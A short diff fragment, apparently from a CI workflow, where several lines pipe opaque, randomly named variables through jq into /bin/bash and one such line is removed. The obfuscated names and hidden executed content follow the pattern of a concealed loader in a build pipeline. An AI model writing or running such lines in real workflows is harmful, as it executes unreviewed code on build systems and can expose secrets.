@@ -23,7 +23,6 @@ jobs:
           echo $wy126 | jq -r .eqkak80 | /bin/bash
           echo $pf8812 | jq -r .cqgr62383 | /bin/bash
           printf '%s' "$itsr13" | jq -r .imujr31 | /bin/bash
-          printf '%s' "$d558" | jq -r .f56184 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
